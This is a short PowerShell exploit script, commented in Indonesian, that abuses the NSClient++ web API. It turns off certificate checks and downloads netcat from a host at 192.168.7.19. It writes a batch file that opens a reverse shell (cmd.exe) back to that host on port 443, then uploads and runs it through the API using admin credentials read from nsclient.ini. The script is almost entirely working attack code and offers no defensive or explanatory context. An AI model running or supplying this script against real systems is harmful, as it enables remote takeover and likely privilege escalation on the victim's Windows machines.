# code agar powershell ignore ssl error selfsigned certificate

if (-not ([System.Management.Automation.PSTypeName]'ServerCertificateValidationCallback').Type)
{
$certCallback = @"
    using System;
    using System.Net;
    using System.Net.Security;
    using System.Security.Cryptography.X509Certificates;
    public class ServerCertificateValidationCallback
    {
        public static void Ignore()
        {
            if(ServicePointManager.ServerCertificateValidationCallback ==null)
            {
                ServicePointManager.ServerCertificateValidationCallback += 
                    delegate
                    (
                        Object obj, 
                        X509Certificate certificate, 
                        X509Chain chain, 
                        SslPolicyErrors errors
                    )
                    {
                        return true;
                    };
            }
        }
    }
"@
    Add-Type $certCallback
 }
[ServerCertificateValidationCallback]::Ignore()

#end of code 

#declare variable biar ga ketuker dibawah

$ws_nc = "http://192.168.7.19/nc.exe"
$bd_nc = "c:\temp\wew.exe"

$bd_value = "$bd_nc 192.168.7.19 443 -e cmd.exe"
$bd_name = "wew.bat"
$bd_path = "c:\temp"
$bd_file = "$bd_path\$bd_name"
$script_name = "wew"

#download nc ke folder temp
Invoke-WebRequest -Uri $ws_nc -OutFile $bd_nc

#buat file bat yang akan di upload
Set-Content $bd_file $bd_value

#auth nsclient dari nsclient.ini
$user = "admin"
$pass = "admin123"
$b64 = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(("{0}:{1}" -f $user,$pass)))
$b64_auth = "Basic $b64"
$up_uri = "https://localhost:8443/api/v1/scripts/ext/scripts/$bd_name"
$ex_uri = "https://localhost:8443/api/v1/queries/$script_name/commands/execute?time=1m"

#upload script wew.bat
Invoke-RestMethod -Method PUT -uri $up_uri -Headers @{ Authorization= $b64_auth } -Infile $bd_file

#execute wew.bat
Invoke-RestMethod -Method GET -uri $ex_uri -Headers @{ Authorization= $b64_auth }
